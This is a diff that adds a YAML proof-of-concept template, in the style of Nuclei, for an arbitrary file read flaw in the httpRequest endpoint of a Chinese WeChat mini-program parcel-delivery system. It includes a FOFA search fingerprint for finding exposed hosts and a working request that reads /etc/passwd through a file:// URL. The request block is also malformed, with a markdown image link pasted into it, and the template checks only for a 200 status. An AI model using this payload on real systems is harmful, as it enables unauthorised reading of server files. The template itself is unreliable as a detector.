@@ -1,0 +1,21 @@
+id: poc-od6c4ggbfe8dly8m
+info:
+  name: 快递微信小程序系统 httpRequest 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/od6c4ggbfe8dly8m'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: od6c4ggbfe8dly8m
+    fofa: body="static/default/newwap/lang/js/jquery.localize.min.js"
+http:
+- raw:
+  - 'GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730682365926-314d8d48-2494-4f51-92a6-ae3c31a5b314.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
